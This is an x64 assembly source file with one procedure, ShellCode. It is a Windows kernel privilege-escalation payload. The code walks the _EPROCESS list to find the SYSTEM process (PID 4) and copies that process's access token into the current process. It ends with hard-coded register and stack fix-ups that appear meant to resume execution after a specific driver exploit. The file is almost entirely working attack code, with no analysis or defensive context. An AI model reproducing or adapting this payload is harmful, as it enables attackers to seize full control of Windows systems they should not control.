.code 
ShellCode proc
xor rax, rax                    ; Set ZERO
mov rax, gs:[rax + 188h]        ; Get nt!_KPCR.PcrbData.CurrentThread
                                ; _KTHREAD is located at GS : [0x188]

mov rax, [rax +220h]            ; Get nt!_KTHREAD.ApcState.Process
mov rcx, rax                    ; Copy current process _EPROCESS structure
mov r11, rcx                    ; Store Token.RefCnt
and r11, 7

mov rdx, 4h                     ; SYSTEM process PID = 0x4

SearchSystemPID:
mov rax, [rax + 2e8h]           ; Get nt!_EPROCESS.ActiveProcessLinks.Flink
sub rax, 2e8h
cmp[rax + 2e0h], rdx            ; Get nt!_EPROCESS.UniqueProcessId
jne SearchSystemPID
mov rdx, [rax + 358h]           ; Get SYSTEM process nt!_EPROCESS.Token
and rdx, 0fffffffffffffff0h
or rdx, r11
mov[rcx + 358h], rdx 
loc_1400865AE:
add rsp, 10h
mov r12,0
mov r15,0
mov r14,0
mov rsi,00000000c00000bbh
mov rdi,4dh
mov rdx,0
mov rbx,3
ret
ShellCode endp 
end
